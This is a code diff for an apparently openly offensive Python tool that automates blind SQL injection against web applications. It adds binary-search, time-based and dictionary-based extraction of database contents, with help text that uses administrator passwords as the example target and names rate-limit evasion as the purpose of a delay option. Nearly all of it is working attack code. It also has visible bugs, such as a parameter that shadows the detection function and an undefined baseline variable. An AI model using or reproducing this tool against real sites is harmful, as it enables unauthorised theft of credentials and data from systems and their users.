@@ -4,6 +4,8 @@ import string
 import argparse
 import json
 import os
+import sys
+import select
 from urllib.parse import quote
 
 CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
@@ -115,84 +117,81 @@ def is_injectable(url, request_template=None, injectable_headers={}, static_head
     return False, None
 
 def detect_database(url, request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
-
     print("[*] Attempting to detect the database type...")
 
-    if args.verbose:
-        if not args.sleep_only:
-            print(f"[VERBOSE] Detection method: {detection}")
-
-    # Override
-    if args.sleep_only:
-        return sleep_detection(url, request_template, injectable_headers, static_headers, args)
+    if args.verbose and not args.sleep_only:
+        print(f"[VERBOSE] Detection method: {detection}")
 
     # Step 1: Baseline request
-    if args.verbose:
-        print(f"[VERBOSE] Sending baseline request...")
-    
     try:
-        response, baseline_status_code, baseline_content_length, response_time = baseline_request(
+        response, baseline_status_code, baseline_content_length, _ = baseline_request(
             url, request_template, injectable_headers, static_headers, args
         )
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during baseline request: {e}")
         return None, None
 
-    # Step 2: Version queries
-    if args.verbose:
-        print(f"[VERBOSE] Sending version queries to detect database...")
-
+    # Step 2: Attempt to detect database
     for db_name, info in version_queries.items():
-        query = info["version_query"]
-        payload = f"' AND ({query})"
-        encoded_payload = quote(payload)
+        db_query = info["version_query"]
+        sleep_query = info.get("sleep_function", None)
 
-        if args.verbose:
-            print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
-
-        try:
-            response, response_time = injection(
+        # Override
+        if args.sleep_only:
+            print(f"[*] Sleep-only mode enabled. Trying sleep-based detection for {db_name}...")
+            detected_db, substring_function = detection(
                 url=url,
-                encoded_payload=encoded_payload,
+                db_name=db_name,
+                query=db_query,
+                sleep_query=sleep_query,
                 request_template=request_template,
                 injectable_headers=injectable_headers,
                 static_headers=static_headers,
+                detection=detection,
+                args=args
+            )
+        else:
+            detected_db, substring_function = detection(
+                url=url,
+                db_name=db_name,
+                query=db_query,
+                sleep_query=sleep_query,
+                request_template=request_template,
+                injectable_headers=injectable_headers,
+                static_headers=static_headers,
+                detection=detection,
                 args=args
             )
 
-            if not response:
-                return None, None
-
-            if args.delay > 0:
-                if args.verbose:
-                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-                time.sleep(args.delay)
-
-            if detection == "keyword":
-                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
-                    print(f"[+] True keyword(s) detected in response. Database likely: {db_name}")
-                    return db_name, info.get("substring_function", None)
-                if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
-                    print(f"[+] False keyword(s) detected in response. Database likely: {db_name}")
-                    return db_name, info.get("substring_function", None)
-            elif detection == "status":
-                if response.status_code != baseline_status_code:
-                    print(f"[+] Database detected: {db_name} (status code changed: {response.status_code})")
-                    return db_name, info.get("substring_function", None)
-            elif detection == "content":
-                response_content_length = len(response.text)
-                if response_content_length != baseline_content_length:
-                    print(f"[+] Database detected: {db_name} (content length changed: {response_content_length})")
-                    return db_name, info.get("substring_function", None)
-
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Error during database detection for {db_name}: {e}")
+        if detected_db:
+            return detected_db, substring_function
 
     # Fallback
-    print("[*] Fallback: Attempting sleep based detection...")
-    return sleep_detection(url, request_template, injectable_headers, static_headers, args)
+    print(f"[*] Regular detection failed. Attempting sleep-based detection...")
+    for db_name, info in version_queries.items():
+        sleep_query = info.get("sleep_function", None)
+        if not sleep_query or sleep_query == "N/A":
+            continue
 
-def discover_length(url, table, column, where_clause, db_name, detection="status", max_length=100, request_template=None, injectable_headers={}, static_headers={}, args=None):
+        detected_db, substring_function = detection(
+            url=url,
+            db_name=db_name,
+            query=None,
+            sleep_query=sleep_query,
+            request_template=request_template,
+            injectable_headers=injectable_headers,
+            static_headers=static_headers,
+            detection=detection,
+            args=args
+        )
+
+        if detected_db:
+            return detected_db, substring_function
+
+    print(f"[-] Unable to detect the database type using regular and sleep-based methods.")
+    return None, None
+
+def discover_length(url, table, column, where_clause, db_name, detection="status", max_length=1000, request_template=None, injectable_headers={}, static_headers={}, args=None):
 
     if db_name not in version_queries:
         print(f"[-] Database {db_name} not found in version queries.")
@@ -347,6 +346,11 @@ def extract_data(url, table, column, where_clause, string_function, position, db
             print(f"[-] Error loading wordlist: {e}")
             return extracted_data
 
+    if not data_length:
+        print(f"[!] Data length not discovered. Using fallback detection...")
+        data_length = args.max_length
+        print(f"[!] Defaulting to max length: {data_length} (can be adjusted with --max-length)")
+
     # Step 1: Baseline request
     try:
         response, baseline_status_code, baseline_content_length, _ = baseline_request(
@@ -356,31 +360,86 @@ def extract_data(url, table, column, where_clause, string_function, position, db
         print(f"[-] Error during baseline request: {e}")
         return extracted_data
 
-    # Step 2: Iterate through possible characters or words until data_length is reached
-    while position <= data_length:
-        found_match = False
-        for value in wordlist if wordlist else CHARSET:
+    # Binary Override
+    if args.binary:
+        while position <= data_length:
+            low, high = 32, 126
+            found_match = False
+            while low <= high:
+                mid = (low + high) // 2
+                payload = f"' AND ASCII({substring_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
+                encoded_payload = quote(payload)
+
                 result = extract_value(
-                    url, table, column, where_clause, string_function, position, value, 
-                    request_template, injectable_headers, static_headers, 
-                    extraction, baseline_status_code, baseline_content_length, args
+                    url, table, column, where_clause, string_function, position, chr(mid),
+                    request_template, injectable_headers, static_headers,
+                    extraction, baseline_status_code, baseline_content_length,
+                    db_name=db_name, sleep_mode=False, encoded_payload=encoded_payload, args=args
                 )
 
                 if result:
-                    extracted_data += result
-                    print(f"Value found: {value} at position {position}")
-                    position += len(result)
-                    found_match = True
-                    break
+                    low = mid + 1
+                else:
+                    high = mid - 1
+
+            if 32 <= low <= 126:  # Ensure valid ASCII range
+                extracted_data += chr(low)
+                print(f"Value found: {chr(low)} at position {position}")
+                found_match = True
+            else:
+                print(f"[*] No valid match found at position {position}. Moving to next position.")
+
+            position += 1
+
+            if not found_match:
+                print(f"[*] No match found at position {position}. Stopping extraction.")
+                break
+
+    # Step 2: Iterate until we reach data_length
+    while position <= data_length:
+        found_match = False
+        fallback_to_char = False
+        if position > (2 * data_length // 3):
+            fallback_to_char = one_third()
+
+        for value in wordlist if wordlist and not fallback_to_char else CHARSET:
+            if wordlist and len(value) > (data_length - position + 1):
+                continue
+
+            # Sleep Override
+            if args.sleep_only:
+                result = extract_value(
+                    url, table, column, where_clause, string_function, position, value, 
+                    request_template, injectable_headers, static_headers, 
+                    extraction, baseline_status_code, baseline_content_length, 
+                    db_name=db_name, sleep_mode=True, args=args
+                )
+            else:
+                result = extract_value(
+                    url, table, column, where_clause, string_function, position, value, 
+                    request_template, injectable_headers, static_headers, 
+                    extraction, baseline_status_code, baseline_content_length, 
+                    db_name=db_name, sleep_mode=False, args=args
+                )
+
+            if result:
+                extracted_data += result
+                print(f"Value found: {value} at position {position}")
+                position += len(result)
+                found_match = True
+                break
 
         # Fallback
         if not found_match:
             print("[*] Fallback: Attempting sleep-based extraction...")
-            for value in wordlist if wordlist else CHARSET:
-                result = sleep_extraction(
-                    url, table, column, where_clause, string_function, position, 
-                    value, request_template, injectable_headers, static_headers, 
-                    db_name, args
+            for value in wordlist if wordlist and not fallback_to_char else CHARSET:
+                if wordlist and len(value) > (data_length - position + 1):
+                    continue
+                result = extract_value(
+                    url, table, column, where_clause, string_function, position, value, 
+                    request_template, injectable_headers, static_headers, 
+                    extraction, baseline_status_code, baseline_content_length, 
+                    db_name=db_name, sleep_mode=True, args=args
                 )
 
                 if result:
@@ -390,12 +449,35 @@ def extract_data(url, table, column, where_clause, string_function, position, db
                     break
 
             if not found_match:
-                print(f"Data extraction complete: {extracted_data}")
+                print(f"[*] No match found at position {position}. Stopping extraction.")
+                position += 1
                 break
+
+        if not found_match and position > data_length:
+            print(f"Data extraction complete")
+            break
 
     return extracted_data
 
 ### Helper Functions <3
+
+def one_third():
+
+    print("\n[*] A third or less of the data remains to be extracted.")
+    print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
+    
+    # Wait for user input for 20 seconds, otherwise fallback automatically
+    i, _, _ = select.select([sys.stdin], [], [], 20)
+    
+    if i:
+        user_input = sys.stdin.readline().strip().lower()
+        if user_input == 'y':
+            return True
+        elif user_input == 'n':
+            return False
+    else:
+        print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
+        return True
 
 def load_request(file_path):
 
@@ -466,6 +548,31 @@ def send_request(url=None, headers=None, body=None, method="GET", args=None):
         print(f"[-] Error during {method} request: {e}")
         return None
 
+def baseline_request(url, request_template, injectable_headers, static_headers, args):
+
+    start_time = time.time()
+
+    if request_template:
+        method, url, headers, body = parse_request(request_template)
+        response = send_request(method=method, url=url, headers=headers, body=body, args=args)
+    else:
+        headers = {**static_headers, **injectable_headers}
+        if args.data:
+            response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+        else:
+            response = requests.get(url, headers=headers, timeout=args.timeout)
+
+    end_time = time.time()
+    baseline_status_code = response.status_code
+    baseline_content_length = len(response.text)
+    response_time = end_time - start_time
+
+    if args.verbose:
+        print(f"[VERBOSE] Baseline response status: {baseline_status_code}, content length: {baseline_content_length}")
+        print(f"[VERBOSE] Response time: {response_time} seconds")
+
+    return response, baseline_status_code, baseline_content_length, response_time
+
 def injection(url, encoded_payload, request_template, injectable_headers, static_headers, args):
 
     try:
@@ -499,83 +606,124 @@ def injection(url, encoded_payload, request_template, injectable_headers, static
         print(f"[-] Error during request: {e}")
         return None, None
 
-def baseline_request(url, request_template, injectable_headers, static_headers, args):
-
-    start_time = time.time()
-
-    if request_template:
-        method, url, headers, body = parse_request(request_template)
-        response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-    else:
-        headers = {**static_headers, **injectable_headers}
-        if args.data:
-            response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-        else:
-            response = requests.get(url, headers=headers, timeout=args.timeout)
-
-    end_time = time.time()
-    baseline_status_code = response.status_code
-    baseline_content_length = len(response.text)
-    response_time = end_time - start_time
-
+def detection(url, db_name, query, sleep_query, request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
+   
     if args.verbose:
-        print(f"[VERBOSE] Baseline response status: {baseline_status_code}, content length: {baseline_content_length}")
-        print(f"[VERBOSE] Response time: {response_time} seconds")
+        print(f"[VERBOSE] Detection method: {detection}")
+    
+    if args.sleep_only and sleep_query and sleep_query != "N/A":
+        print(f"[*] Performing sleep-based detection for {db_name}...")
+        
+        for db_specific, sleep_function in sleep_query.items():
+            if not sleep_function or sleep_function == "N/A":
+                print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
+                continue
 
-    return response, baseline_status_code, baseline_content_length, response_time
+            payload = f"' AND {sleep_function}"
+            encoded_payload = quote(payload)
 
-def sleep_detection(db_name, sleep_query, url, request_template, injectable_headers, static_headers, args):
+            if args.verbose:
+                print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
 
-    if not sleep_query or sleep_query == "N/A":
-        print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
+            try:
+                response, response_time = injection(
+                    url=url,
+                    encoded_payload=encoded_payload,
+                    request_template=request_template,
+                    injectable_headers=injectable_headers,
+                    static_headers=static_headers,
+                    args=args
+                )
+
+                if not response:
+                    return None, None
+
+                if response_time > 5:
+                    print(f"[+] Sleep-based detection: Database detected as {db_name}")
+                    return db_name, version_queries[db_name].get("substring_function", None)
+
+                if args.delay > 0:
+                    if args.verbose:
+                        print(f"[VERBOSE] Delaying requests for {args.delay} seconds...")
+                    time.sleep(args.delay)
+
+            except requests.exceptions.RequestException as e:
+                print(f"[-] Error during sleep-based detection for {db_name}: {e}")
+
         return None, None
 
-    for db_specific, sleep_function in sleep_query.items():
-        if not sleep_function or sleep_function == "N/A":
-            print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
-            continue
+    print(f"[*] Attempting regular detection for {db_name}...")
 
-        payload = f"' AND {sleep_function}"
-        encoded_payload = quote(payload)
+    payload = f"' AND ({query})"
+    encoded_payload = quote(payload)
 
-        if args.verbose:
-            print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
+    if args.verbose:
+        print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
 
-        try:
-            response, response_time = injection(
-                url=url,
-                encoded_payload=encoded_payload,
-                request_template=request_template,
-                injectable_headers=injectable_headers,
-                static_headers=static_headers,
-                args=args
-            )
+    try:
+        response, response_time = injection(
+            url=url,
+            encoded_payload=encoded_payload,
+            request_template=request_template,
+            injectable_headers=injectable_headers,
+            static_headers=static_headers,
+            args=args
+        )
 
-            if not response:
-                return None, None
+        if not response:
+            return None, None
 
-            if response_time > 5:
-                print(f"[+] Sleep-based detection: Database detected as {db_name}")
+        if args.delay > 0:
+            if args.verbose:
+                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+            time.sleep(args.delay)
+
+        if detection == "keyword":
+            if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
+                print(f"[+] True keyword(s) detected in response. Database likely: {db_name}")
+                return db_name, version_queries[db_name].get("substring_function", None)
+            if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
+                print(f"[+] False keyword(s) detected in response. Database likely: {db_name}")
+                return db_name, version_queries[db_name].get("substring_function", None)
+        elif detection == "status":
+            if response.status_code != baseline_status_code:
+                print(f"[+] Database detected: {db_name} (status code changed: {response.status_code})")
+                return db_name, version_queries[db_name].get("substring_function", None)
+        elif detection == "content":
+            response_content_length = len(response.text)
+            if response_content_length != baseline_content_length:
+                print(f"[+] Database detected: {db_name} (content length changed: {response_content_length})")
                 return db_name, version_queries[db_name].get("substring_function", None)
 
-            if args.delay > 0:
-                if args.verbose:
-                    print(f"[VERBOSE] Delaying requests for {args.delay} seconds...")
-                time.sleep(args.delay)
-
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Error during sleep-based detection for {db_name}: {e}")
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error during regular detection for {db_name}: {e}")
 
     return None, None
 
-def extract_value(url, table, column, where_clause, string_function, position, value, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, args):
+def extract_value(url, table, column, where_clause, string_function, position, value, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, db_name=None, sleep_mode=False, encoded_payload=None, args=None):
 
-    value_length = len(value)
-    
-    payload = f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{value}'"
-    encoded_payload = quote(payload)
+    if not encoded_payload:
+        value_length = len(value)
+        payload = f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{value}'"
+        encoded_payload = quote(payload)
+
+    if sleep_mode and db_name:
+        sleep_function = version_queries[db_name].get("sleep_function", None)
+        if not sleep_function or sleep_function == "N/A":
+            print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
+            return None
+
+        for db_specific, sleep_query in sleep_function.items():
+            if not sleep_query or sleep_query == "N/A":
+                print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
+                continue
+            payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{value}'"
+            encoded_payload = quote(payload)
 
     try:
+        if args.verbose:
+            print(f"[VERBOSE] Querying Database: {db_name if sleep_mode else 'Regular'} with payload: {encoded_payload}")
+
         response, response_time = injection(
             url=url,
             encoded_payload=encoded_payload,
@@ -593,70 +741,27 @@ def extract_value(url, table, column, where_clause, string_function, position, v
                 print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
             time.sleep(args.delay)
 
-        if extraction == "keyword":
-            if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
+        if sleep_mode:
+            if response_time > 5:
+                print(f"[+] Sleep-based match found: {value} at position {position}")
                 return value
-            if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
-                return None
-        elif extraction == "status":
-            if response.status_code != baseline_status_code:
-                return value
-        elif extraction == "content":
-            response_content_length = len(response.text)
-            if response_content_length != baseline_content_length:
-                return value
+        else:
+            if extraction == "keyword":
+                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
+                    return value
+                if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
+                    return None
+            elif extraction == "status":
+                if response.status_code != baseline_status_code:
+                    return value
+            elif extraction == "content":
+                response_content_length = len(response.text)
+                if response_content_length != baseline_content_length:
+                    return value
 
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during extraction for value {value}: {e}")
+        print(f"[-] Error during {'sleep-based ' if sleep_mode else ''}extraction for {value}: {e}")
         return None
-
-    return None
-
-def sleep_extraction(url, table, column, where_clause, string_function, position, input_value, request_template, injectable_headers, static_headers, db_name, args):
-
-    sleep_function = version_queries[db_name].get("sleep_function", None)
-
-    if not sleep_function or sleep_function == "N/A":
-        print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
-        return None
-
-    value_length = len(input_value)
-
-    for db_specific, sleep_query in sleep_function.items():
-        if not sleep_query or sleep_query == "N/A":
-            print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
-            continue
-
-        payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{input_value}'"
-        encoded_payload = quote(payload)
-
-        if args.verbose:
-            print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
-
-        try:
-            response, response_time = injection(
-                url=url,
-                encoded_payload=encoded_payload,
-                request_template=request_template,
-                injectable_headers=injectable_headers,
-                static_headers=static_headers,
-                args=args
-            )
-
-            if not response:
-                return None
-
-            if response_time > 5:
-                print(f"[+] Sleep-based match found: {input_value} at position {position}")
-                if args.delay > 0:
-                    if args.verbose:
-                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-                    time.sleep(args.delay)
-
-                return input_value
-
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Error during sleep-based extraction for {input_value}: {e}")
 
     return None
 
@@ -674,7 +779,8 @@ def main():
     parser.add_argument('-t', '--table', required=False, help="Table name from which to extract the data")
     parser.add_argument('-c', '--column', required=False, help="Column name to extract (e.g., Password)")
     parser.add_argument('-w', '--where', required=False, help="WHERE clause (e.g., Username = 'Administrator')")
-    parser.add_argument('-m', '--max-length', type=int, default=100, help="Maximum length of the extracted data that the script will check for (default: 100)")
+    parser.add_argument('-m', '--max-length', type=int, default=1000, help="Maximum length of the extracted data that the script will check for (default: 1000)")
+    parser.add_argument('-bi', '--binary', action='store_true', help="Use binary search for ASCII extraction")
     parser.add_argument('-da', '--dictionary-attack', required=False, help="Path to a wordlist file for dictionary-based extraction.")
     parser.add_argument('--delay', type=float, default=0, help="Delay in seconds between requests to bypass rate limiting")
     parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
